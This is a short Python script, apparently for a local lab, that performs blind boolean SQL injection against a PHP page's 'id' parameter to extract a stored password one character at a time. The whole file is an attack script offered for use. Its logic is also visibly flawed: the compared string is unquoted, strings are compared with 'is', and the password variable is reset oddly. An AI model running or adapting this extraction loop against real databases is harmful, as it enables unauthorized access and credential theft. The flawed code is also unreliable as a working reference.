import requests
import sys

password = None
for i in range(1,30):
    for c in range(sys.maxunicode):
        if password is None or len(password) is 1:
            password = chr(c)
        testc = f"1 AND BINARY LEFT(password, {str(i)})={password + chr(c)}"
        print(testc)
        response = requests.get('http://localhost:9999/active.php', { 'id': testc })
        if ('active' in response.text):
            print('hello')
            print(chr(c))
            if password is not chr(c):
                password = password + chr(c)
            break